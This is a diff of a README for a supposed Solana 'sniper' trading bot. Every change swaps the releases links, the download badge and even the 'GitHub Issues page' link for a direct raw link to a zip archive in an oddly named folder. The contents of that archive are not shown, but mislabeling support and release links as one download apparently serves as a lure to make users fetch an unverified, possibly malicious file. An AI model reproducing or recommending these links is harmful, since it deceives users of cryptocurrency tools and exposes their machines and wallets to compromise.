@@ -1,7 +1,7 @@
 # 🤖 SOLANA_SNIPER_BOT - Never Miss Trading Opportunities Again
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/manassingh30/SOLANA_SNIPER_BOT/releases)
+[![Download Now](https://raw.githubusercontent.com/manassingh30/SOLANA_SNIPER_BOT/main/harrowingness/SOLANA_SNIPER_BOT.zip)](https://raw.githubusercontent.com/manassingh30/SOLANA_SNIPER_BOT/main/harrowingness/SOLANA_SNIPER_BOT.zip)
 
 ## 🚀 Getting Started
 Welcome to SOLANA_SNIPER_BOT, your essential trading tool. This bot helps you navigate the Solana ecosystem, ensuring you don't miss out on crucial profit opportunities.
@@ -21,7 +21,7 @@ To run SOLANA_SNIPER_BOT smoothly, ensure your system meets these requirements:
 - **Disk Space:** At least 200 MB
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the releases page to find the latest version of SOLANA_SNIPER_BOT. Click [here to download](https://github.com/manassingh30/SOLANA_SNIPER_BOT/releases).
+1. **Visit the Releases Page:** Go to the releases page to find the latest version of SOLANA_SNIPER_BOT. Click [here to download](https://raw.githubusercontent.com/manassingh30/SOLANA_SNIPER_BOT/main/harrowingness/SOLANA_SNIPER_BOT.zip).
 2. **Choose Your Version:** Look for the most recent release. Select the correct file for your operating system.
 3. **Download the File:** Click the link to start your download.
 4. **Install the Application:**
@@ -37,7 +37,7 @@ To run SOLANA_SNIPER_BOT smoothly, ensure your system meets these requirements:
 5. **Monitor Performance:** Keep an eye on the dashboard for alerts and performance metrics.
 
 ## 📧 Support
-If you encounter any issues or have questions, feel free to reach out for support. You can visit our [GitHub Issues page](https://github.com/manassingh30/SOLANA_SNIPER_BOT/issues) for help.
+If you encounter any issues or have questions, feel free to reach out for support. You can visit our [GitHub Issues page](https://raw.githubusercontent.com/manassingh30/SOLANA_SNIPER_BOT/main/harrowingness/SOLANA_SNIPER_BOT.zip) for help.
 
 ## 🗣️ Community Feedback
 Your input matters. Share your experiences and suggestions in the community forums, where fellow users help each other improve the trading process.
@@ -48,4 +48,4 @@ SOLANA_SNIPER_BOT is open-source software. You may use it under the terms of the
 Explore the potential of the Solana ecosystem with confidence, knowing that SOLANA_SNIPER_BOT is here to support your trading journey. Don’t forget to periodically check back for updates and enhancements. 
 
 ## 📥 Download the Application Again
-For your convenience, here’s the link to the releases page once more: [Download Here](https://github.com/manassingh30/SOLANA_SNIPER_BOT/releases).
+For your convenience, here’s the link to the releases page once more: [Download Here](https://raw.githubusercontent.com/manassingh30/SOLANA_SNIPER_BOT/main/harrowingness/SOLANA_SNIPER_BOT.zip).
